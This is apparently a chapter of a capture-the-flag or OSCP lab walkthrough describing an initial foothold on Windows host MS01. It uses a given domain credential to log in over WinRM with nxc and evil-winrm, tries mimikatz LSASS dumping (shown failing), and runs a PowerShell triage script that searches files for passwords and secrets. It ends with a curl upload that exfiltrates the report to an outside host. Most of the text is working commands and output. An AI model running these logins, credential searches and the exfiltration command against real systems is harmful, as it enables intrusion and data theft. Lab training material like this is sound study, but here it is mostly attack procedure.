# 02 — Foothold: WinRM as `eric.wallows`

## 2.1 Assumed breach

This set is designed as an assumed-breach scenario: the credential is issued rather than
found.

```
OSCP\eric.wallows : EricLikesRunning800
```

The first question is not "does it work" but "what does it work *for*" — `nxc` answers both,
because a `Pwn3d!` marker is the difference between a shell and an administrative shell.

```bash
nxc smb   192.168.133.153 -u eric.wallows -p EricLikesRunning800 -d oscp.exam
nxc winrm 192.168.133.153 -u eric.wallows -p EricLikesRunning800 -d oscp.exam
```

**Captured** — SMB and WinRM both return `[+]`, and **neither** returns `Pwn3d!`:

```
SMB    192.168.133.153 445  MS01  [+] oscp.exam\eric.wallows:EricLikesRunning800
WINRM  192.168.133.153 5985 MS01  [+] oscp.exam\eric.wallows:EricLikesRunning800
```

A bare `[+]` on WinRM means the account is in `Remote Management Users`; no `Pwn3d!` means it
is **not** in the local `Administrators` group. That distinction is the entire content of
chapter 03.

## 2.2 The shell

```bash
evil-winrm -i 192.168.133.153 -u Eric.Wallows -p EricLikesRunning800
```

First three commands, always, in this order:

```
whoami
whoami /priv
whoami /groups
```

**Captured** — the honest reading of the token:

| | |
|---|---|
| User | `oscp\eric.wallows` |
| Integrity | medium — **not** elevated |
| Groups | `Domain Users`, `Remote Management Users` |
| Administrators | absent |
| `SeImpersonatePrivilege` | present |

`Remote Management Users` is why the shell exists. Its absence from `Administrators` is why
`C:\Users\Administrator` is unreadable and why LSASS will refuse a handle.

> **Instance note.** `SeImpersonatePrivilege` is the documented escalation for this box, and it
> is present in the reference image. On the instance captured here it did **not** appear in
> `whoami /priv` — the same image had been re-provisioned, and the token differed. Chapter 03
> therefore documents both the intended route and the one that worked.

## 2.3 What a non-admin domain user cannot do

Worth establishing explicitly, because it rules out a lot of wasted effort:

```bash
# all of these fail with access denied from eric's token
dir C:\Users\Administrator
reg save HKLM\SAM C:\Windows\Temp\sam.hiv
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

The mimikatz attempt is the instructive one — **captured**:

```
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

`0xc0000061` is *privilege not held* and `0x5` is *access denied*: without SeDebugPrivilege or
SYSTEM, LSASS is unreadable. A WinRM logon does not change the token, so **no amount of
mimikatz from eric's shell will ever work**. That reframes chapter 03 from "optional
escalation" to "prerequisite for everything after it".

## 2.4 Host triage without elevation

Everything useful from an unprivileged shell can be collected in one pass. The collector is
deliberately boring — no downloads, no AMSI-touching technique, no credential access — so it
is safe to run at any privilege level and can be re-run after escalation to diff the results.

```powershell
<#
  Invoke-MS01Triage.ps1 — low-privilege triage collector.
  Runs as ANY user; adds admin-only sections automatically when elevated.
#>
[CmdletBinding()]
param([string]$OutDir = $env:TEMP, [switch]$SkipFileSearch)

$ErrorActionPreference = 'SilentlyContinue'
$stamp  = Get-Date -Format 'yyyyMMdd_HHmmss'
$report = Join-Path $OutDir "triage_$($env:COMPUTERNAME)_$stamp.txt"
$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

function Section { param([string]$T)
    Add-Content $report "`n=== $T ===" }
function Run { param([string]$L, [scriptblock]$B)
    Add-Content $report "-- $L"
    try { Add-Content $report ((& $B 2>&1 | Out-String -Width 200).TrimEnd()) }
    catch { Add-Content $report "  [error] $($_.Exception.Message)" } }

Add-Content $report "Triage $env:COMPUTERNAME $stamp elevated=$isAdmin"

Section "Identity"
Run 'whoami'         { whoami }
Run 'privileges'     { whoami /priv }
Run 'groups'         { whoami /groups }
Run 'logon server'   { $env:LOGONSERVER }

Section "Host"
Run 'os'             { Get-CimInstance Win32_OperatingSystem |
                       Select-Object Caption, Version, BuildNumber, LastBootUpTime | Format-List }
Run 'local admins'   { net localgroup administrators }
Run 'local users'    { net user }
Run 'sessions'       { query user }
Run 'profiles'       { Get-ChildItem C:\Users -Directory | Select-Object Name, LastWriteTime }

Section "Network"
Run 'ipconfig'       { ipconfig /all }
Run 'routes'         { route print -4 }
Run 'arp'            { arp -a }
Run 'listening'      { Get-NetTCPConnection -State Listen |
                       Sort-Object LocalPort |
                       Select-Object LocalAddress, LocalPort, OwningProcess }

Section "Persistence"
Run 'run keys'       { Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
                                        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' |
                       Format-List }
Run 'winlogon'       { Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' |
                       Select-Object Shell, Userinit, AutoAdminLogon, DefaultUserName }
Run 'tasks'          { Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } |
                       Select-Object TaskPath, TaskName, State }
Run 'services'       { Get-CimInstance Win32_Service |
                       Where-Object { $_.PathName -notlike '*\Windows\*' } |
                       Select-Object Name, State, StartName, PathName }

Section "Credential surface"
Run 'cached logons'  { (Get-ItemProperty 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon').CachedLogonsCount }
Run 'lsa protection' { (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL }
Run 'wdigest'        { (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest').UseLogonCredential }
Run 'uac'            { Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |
                       Select-Object EnableLUA, ConsentPromptBehaviorAdmin, LocalAccountTokenFilterPolicy }

if (-not $SkipFileSearch) {
  Section "Credential-shaped files"
  Run 'search' { Get-ChildItem "$env:USERPROFILE",'C:\Users\Public','C:\ProgramData' `
                   -Recurse -Force -Include *.txt,*.xml,*.config,*.ini,*.ps1,*.bat -Depth 4 |
                 Select-String -Pattern 'password|passwd|pwd=|credential|apikey|secret' -List |
                 Select-Object -First 40 | ForEach-Object { "$($_.Path):$($_.LineNumber)" } }
}

if ($isAdmin) {
  Section "Elevated only"
  Run 'lsa'          { reg query 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' /v RunAsPPL }
  Run 'wifi'         { netsh wlan show profiles }
}

Write-Host "[+] $report"
Compress-Archive -Path $report -DestinationPath "$report.zip" -Force
```

Exfiltrate with what is already on the box — no upload needed:

```powershell
curl.exe -T $report.zip http://192.168.133.1:8888/upload
```

## 2.5 The two findings that matter

**Captured** from that triage:

| Finding | Value | Why it matters |
|---|---|---|
| `CachedLogonsCount` | `10` | the NL$ cache is populated — chapter 04 cracks it |
| `RunAsPPL` | absent | LSASS is dumpable with SYSTEM |
| `C:\Users\web_svc` | present | an IIS app-pool identity with a profile on this host |
| `C:\Users\DefaultAppPool` | present | confirms an IIS site, matching `:8000` from chapter 01 |
| local admins | `Admin`, `Administrator`, `cloudbase-init` | three candidates for the escalation in 03 |

The combination `web_svc` + `DefaultAppPool` + `:8000` is the strongest signal on the box: the
service on port 8000 runs as a **domain** service account, which means the NL$ cache will hold
a domain credential — not just a local one.
